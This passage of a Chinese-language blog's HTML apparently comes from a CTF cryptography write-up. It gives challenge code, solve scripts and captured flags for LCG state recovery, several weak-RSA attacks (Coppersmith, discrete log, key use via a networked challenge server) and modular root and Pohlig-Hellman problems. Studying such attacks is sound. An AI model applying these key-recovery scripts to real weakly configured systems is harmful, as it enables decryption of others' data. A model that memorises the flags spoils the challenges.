class="title">crack_unknown_modulus</span>(<span class="params">states</span>):</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2 * t0 - t1 * t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    m = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N[i+1] = (A*N[i]+B) % M</span></span><br><span class="line"><span class="comment"># A,B,N均未知</span></span><br><span class="line">sequence = [<span class="number">36525894934655222529534846431164486292811941872906741964139901975056461298468</span>,</span><br><span class="line">            <span class="number">44760375502060853569502415785606266854123925363856190745249656424194532471837</span>,</span><br><span class="line">            <span class="number">99435840430130187938928057751136501366281085823686937625866664159577574922185</span>,</span><br><span class="line">            <span class="number">32218838886452625692584366771934359409743014626478611858398172896703555179084</span>,</span><br><span class="line">            <span class="number">75894967689014169953442519719124136776429102657940075770201298059192401503113</span>,</span><br><span class="line">            <span class="number">59195822914392909511892901455781443859673595142363513265120745050537984795930</span>]</span><br><span class="line">modulus, multiplier, increment = crack_unknown_modulus(sequence)</span><br><span class="line">t = sequence[-<span class="number">1</span>]	</span><br><span class="line">d = invert(multiplier, modulus)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    t = (((t - increment) % modulus) * d) % modulus</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(((t - increment) % modulus) * d))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999999999</span>):</span><br><span class="line">    _t = t + i * modulus</span><br><span class="line">    <span class="built_in">print</span>(_t)</span><br><span class="line">    flag = long_to_bytes(_t)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag, i)</span><br></pre></td></tr></table></figure>

<p>为什么爆破了好久出不来，如果flag很大的话，那这样是很难出来的；因为我们求出来的这256伪随机数，是在模c下的，相当于我们知道的第一个状态，只是和flag同余的一个数，如果flag稍微大点，就要利用同余等式去枚举</p>
<p>怎么会有这么不要脸的东西</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210902103314795.png" alt="image-20210902103314795"></p>
<p>暂时不会了，可能还有隐藏的套娃</p>
<hr>
<blockquote>
<p>flag{easyLcG!}</p>
</blockquote>
<p>哒哒哒哒哒</p>
<p><em>出题师傅看到我博客上写着unsolved就亲自指导了，也太nice了吧</em></p>
<p>求出来的模数还有一个公因子3，由于当时是通过getPrime取得的，所以正确模数应该是个素数</p>
<p>多整除个3就出了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">modulus = modulus // <span class="number">3</span></span><br><span class="line">t = sequence[-<span class="number">1</span>]</span><br><span class="line">d = invert(multiplier, modulus)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    t = (((t - increment) % modulus) * d) % modulus</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(t))</span><br></pre></td></tr></table></figure>

<p>应该是这里的问题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211014132539513.png" alt="image-20211014132539513"></p>
<p>出来的可能是<code>k*n</code></p>
<h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_prime</span>(<span class="params">x</span>):</span></span><br><span class="line">    x += getPrime(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(x):</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">textbookRSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = generate_prime(p)</span><br><span class="line">        self.N = self.p * self.q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = invert(self.e, (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> m &lt; self.N</span><br><span class="line">        <span class="keyword">return</span> powmod(m, self.e, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">return</span> powmod(c, self.d, self.N)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">enc = textbookRSA(getPrime(<span class="number">512</span>))</span><br><span class="line">c, N = enc.encrypt(bytes_to_long(flag)), enc.N</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">40201544209443285599758189301888608601617874513443526548767757353443929151606722009781340637038714737084415903404819864837006813001196360676445857711384896521463808871500382419732201463547283765775164260612131076631479489522332895847086866318107250553614928244783290548532630896717593368294734888363949457545</span></span><br><span class="line"><span class="string">114741910526756640742537765026673760290351576565995368541784885613800696330239577637413166195346207752006116626595608590117773931022872753795837847792402503651299975473904115705416410939337300159818820792886315026470035856630685448353338137360972444341989751746886768451631705313621681461055224875826857697751</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题似曾相熟，开方已知p高位，CopperSmith一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">40201544209443285599758189301888608601617874513443526548767757353443929151606722009781340637038714737084415903404819864837006813001196360676445857711384896521463808871500382419732201463547283765775164260612131076631479489522332895847086866318107250553614928244783290548532630896717593368294734888363949457545</span></span><br><span class="line">n = <span class="number">114741910526756640742537765026673760290351576565995368541784885613800696330239577637413166195346207752006116626595608590117773931022872753795837847792402503651299975473904115705416410939337300159818820792886315026470035856630685448353338137360972444341989751746886768451631705313621681461055224875826857697751</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">kbits = <span class="number">202</span></span><br><span class="line">p0 = <span class="built_in">int</span>(iroot(n, <span class="number">2</span>)[<span class="number">0</span>]) &gt;&gt; kbits &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p0 + x</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p = p0 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{fermat_factorization_is_easy}</p>
</blockquote>
<p>emmmm费马分解，打扰了</p>
<h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">textbookRSA</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, p, q, e</span>):</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.q = q</span><br><span class="line">        self.N = self.p * self.q</span><br><span class="line">        self.e = getPrime(<span class="number">23</span>)</span><br><span class="line">        self.d = invert(self.e, (self.p - <span class="number">1</span>) * (self.q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, m</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> m &lt; self.N</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(m, self.e, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(c, self.d, self.N)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vulnerability</span>(<span class="params">self</span>):</span></span><br><span class="line">        vul = [<span class="built_in">pow</span>(<span class="number">2</span>, self.e, self.N), <span class="built_in">pow</span>(<span class="number">4</span>, self.e, self.N), <span class="built_in">pow</span>(<span class="number">8</span>, self.e, self.N)]</span><br><span class="line">        <span class="keyword">return</span> vul</span><br><span class="line"></span><br><span class="line">enc = textbookRSA(getPrime(<span class="number">27</span>), getPrime(<span class="number">27</span>), getPrime(<span class="number">23</span>))</span><br><span class="line">c, vul = enc.encrypt(bytes_to_long(flag)), enc.vulnerability()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(vul)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5661705370298896</span></span><br><span class="line"><span class="string">[6716715946456033, 1533036361566453, 2286114319392486]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>选择明文攻击（bushi）先获得n， Pollard’s kangaroo光滑的袋鼠（bushi）得到e，n好可以分解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">5661705370298896</span></span><br><span class="line">vul = [<span class="number">6716715946456033</span>, <span class="number">1533036361566453</span>, <span class="number">2286114319392486</span>]</span><br><span class="line">n = gcd(vul[<span class="number">0</span>]**<span class="number">2</span>-vul[<span class="number">1</span>], vul[<span class="number">0</span>]**<span class="number">3</span>-vul[<span class="number">2</span>])</span><br><span class="line">b = Mod(<span class="number">2</span>, n)</span><br><span class="line">vul0 = Mod(vul[<span class="number">0</span>], n)</span><br><span class="line">e = discrete_log_lambda(vul0, b, (getPrime(<span class="number">22</span>), getPrime(<span class="number">24</span>)))</span><br><span class="line">p, q = factor(n)[<span class="number">0</span>][<span class="number">0</span>], factor(n)[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{345y_}</p>
</blockquote>
<h2 id="FuckPython-RSA1"><a href="#FuckPython-RSA1" class="headerlink" title="FuckPython-RSA1"></a>FuckPython-RSA1</h2><p>nc开着，好评</p>
<p>emmmmm总感觉哪里不对</p>
<blockquote>
<p>nc 39.106.29.44 10106</p>
</blockquote>
<p>好在题目是正确的</p>
<p>比较简单，给一个nc，连上去，要python2，遍历256个字节；之后会得到RSA的公私钥和密文，解密就好</p>
<p>第一次因为窗口的原因，显示少了，解出来的flag不对，所以我都用脚本实现最后send过去。然后发现是wt的窗口显示少了，不过好在这道题用到的理论储备并没有出大问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 39.106.29.44 10106</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">space = [<span class="built_in">chr</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">sh = remote(<span class="string">&#x27;39.106.29.44&#x27;</span>, <span class="number">10106</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    <span class="comment"># md5(XXX + &#x27;6a7943b6c92e79&#x27;.decode(&#x27;hex&#x27;)) == 0e503536b5304015ab9594ec2a5b68af</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = proof[<span class="number">11</span>:<span class="number">25</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    HASH = proof[<span class="number">45</span>:<span class="number">77</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">3</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        x = head + tail</span><br><span class="line">        t = md5(x).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pem2txt</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp1:</span><br><span class="line">        fp1.write(s)</span><br><span class="line">    fp1.close()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fp2:</span><br><span class="line">        key = fp2.read()</span><br><span class="line">        rsakey = RSA.importKey(key)</span><br><span class="line">        <span class="comment"># &lt;_RSAobj @0x7f14f88bf410 n(2048),e,d,p,q,u,private&gt;</span></span><br><span class="line">        <span class="keyword">return</span> rsakey.n, rsakey.d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line"><span class="comment"># Crypto Challenge</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pem = sh.recvuntil(<span class="string">b&#x27;-----END RSA PRIVATE KEY-----&#x27;</span>)[<span class="number">1</span>:]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;flag2 ==&gt; &#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&#x27;&#x27;Input your flag:&#x27;&#x27;&#x27;</span>)</span><br><span class="line">n, d = pem2txt(pem)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">sh.sendline(flag)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{RSA_private_k3y_WHITE_GIVE}</p>
</blockquote>
<h2 id="FuckPython-RSA2（unsolved）"><a href="#FuckPython-RSA2（unsolved）" class="headerlink" title="FuckPython-RSA2（unsolved）"></a>FuckPython-RSA2（unsolved）</h2><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211110135842750.png" alt="image-20211110135842750"></p>
<p>端口给的和FuckPython-RSA1是一样的，但里面没有第二道密码题了（雾</p>
<h2 id="简单的数学0"><a href="#简单的数学0" class="headerlink" title="简单的数学0"></a>简单的数学0</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5(flag).hexdigest() == <span class="string">&#x27;f9b24dfbe7d8abaab8b6a0188782eff5&#x27;</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">1</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3514205322103302728670602150841765811918844361962796570872272936440995516620485389724521788163049805962351733199966478659283631463151399360865675815083685</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>不是RSA已知c，p，e的题型，p不知道</p>
<p>虽然确实有个oracle检验我们的flag是否是正确的，但是不知道p我没什么思路</p>
<p>第二天附件更新，给了p，我就说哈哈哈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">8803822563647270623115855698498072941389567371514602911761887238000858306724820208054957805578533078861661091923759508072298768127983369027700000415655223</span></span><br><span class="line">p = <span class="number">12913561406317113183635547158985401377756429238562558559079682073564209000830793328430323950547190141901547099900430790186447107756095983956460182437021627</span></span><br></pre></td></tr></table></figure>

<p>直接用平方根了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">c = <span class="number">8803822563647270623115855698498072941389567371514602911761887238000858306724820208054957805578533078861661091923759508072298768127983369027700000415655223</span></span><br><span class="line">p = <span class="number">12913561406317113183635547158985401377756429238562558559079682073564209000830793328430323950547190141901547099900430790186447107756095983956460182437021627</span></span><br><span class="line">e = <span class="number">0x100000</span></span><br><span class="line">mi = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    mi.append(<span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    mi.append(p - <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p))</span><br><span class="line">    c = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mi:</span><br><span class="line">    t = long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> md5(t).hexdigest() == <span class="string">&#x27;f9b24dfbe7d8abaab8b6a0188782eff5&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{easymathalgorithm}</p>
</blockquote>
<h2 id="简单的数学1"><a href="#简单的数学1" class="headerlink" title="简单的数学1"></a>简单的数学1</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">factors = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</span><br><span class="line">power   = [<span class="number">17</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">m = <span class="number">2</span></span><br><span class="line">e = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">N = reduce(<span class="keyword">lambda</span> x, y: x * y,[factors[i] ** power[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))]) + <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(N) <span class="keyword">and</span> e &lt; N</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1581213514613638887702604302628425969362759</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">factors = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>]</span><br><span class="line">power   = [<span class="number">17</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">m = <span class="number">2</span></span><br><span class="line">N = reduce(<span class="keyword">lambda</span> x, y: x * y,[factors[i] ** power[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))]) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">1581213514613638887702604302628425969362759</span></span><br><span class="line">c = Mod(c, N)</span><br><span class="line">m = Mod(m, N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(discrete_log(c, m)))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{you_got_ph}</p>
</blockquote>
<h2 id="困难一点点的数学0（unsolved）"><a href="#困难一点点的数学0（unsolved）" class="headerlink" title="困难一点点的数学0（unsolved）"></a>困难一点点的数学0（unsolved）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">4</span>] == <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>(<span class="params">limit</span>):</span></span><br><span class="line">    primes = [<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> primes[-<span class="number">1</span>] &lt; limit:</span><br><span class="line">        primes += [next_prime(primes[-<span class="number">1</span>])]</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">global</span> primes</span><br><span class="line">    </span><br><span class="line">    e = <span class="number">1</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    q = next_prime(q)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        n *= q ** primes[randint(<span class="number">0</span>, <span class="number">5</span>)]</span><br><span class="line">        q = next_prime(q)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e *= primes[randint(<span class="number">0</span>, <span class="built_in">len</span>(primes) - <span class="number">1</span>)] ** primes[randint(<span class="number">0</span>, <span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (n, e)</span><br><span class="line"></span><br><span class="line">primes = pre(<span class="number">100</span>)</span><br><span class="line">n, e = gen(<span class="number">2</span> ** <span class="number">128</span>)</span><br><span class="line">len_ = n.bit_length()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag + urandom((len_ &gt;&gt; <span class="number">3</span>) - <span class="built_in">len</span>(flag)))</span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">11994856154408832550226173326306706948322784186267813285424273727457277570449721708469377333295795450316798985747411428007939478275824993378444272641075595828905331211398917692117185101479077398613046411577116685482608874046448872880344276808220924860769086887940958633441714352583855540999548720044322998264846012161431636662433683276562625027092028130005970114647137832180580174041968866569822387764690463959881397320450667236461741620403395599935845735617477280364151807003271533625363666352062617204207977554178272479567385510394164676984094113453536958667301026374275130979677305822214444335545662001110540052205079456125870487695548122936396959457217914532553325619253546791069692985512699358985463221502502084675209516472887973080192751916784600603877788797705458888760552581342959043655183973152680603248917128462709597030509958883674860205970644241146476304149515438669191043736965162506814748737378119531830170603146515955648287154128232624377713379199023238511614078806426562021069638546292232028008642595243475950555611966843590609370802372713922810842109296634261927855897749685466429848085401683729949137325841031448197225286597985926477607730381020542179177937190267395728321154320663113144417493792344192501728192224067408526468047697092815734745508911899235305415196605573552817031582341240841963500082141599736527564221706520431869455796746093434293683100803464504347573705307339278622142604231243731290546424726300181230919587809100360017180646300141932273203009540779621343752276406327270280696985946756857577522536182716290889259854732662916401670054957144740292721681742707739784073111634648716873018489059318376430379543710047917376490266767875239644497833040110744093598044604501318749065110017000755265530585848590714646543215789831321305186253110749828658194624302871154167229533880360661192631336611540590753329799514109722282049242508985274973975569128167197103339329219857542511675333185438424100205435264185442625212957816223665085393904833681032006083319868956112013073947804141313761890184012761243094669629438534487954505709858329677691050279420667276012005715403824771026942764503867179041742712964566104284721980020875049780798089586557353746689141977077518535458410939575796862938638716615803650407786897854972763793186411099146552957299304020322056573695947636353479929828321017230745880492761198924142557387134524722498789054500072958840330107186959238787198423202007480930533185363864760876539962555722806312411851288978109934860380767506470800563090423502953911794718800665163227148855219153379250626032923411536090260611564327090513624773651630139865213054047971676969921132075382597029378871818496911936273603167169708274436918974731159618512856370147955309970639864283488998194291564522716718108808644500794139567941894324821270494322487330771480736023069465090696594967014241811185428807158275522064429448212412679526940639213423056138417455582473816078505889037913398303842261835933581251153905467725831957314379762137644348555546053964035105996510374509932329977348336229876173135652873412359763033310447686419768148309532098091688546115562450592460242975433396729597685387307</span></span><br><span class="line"><span 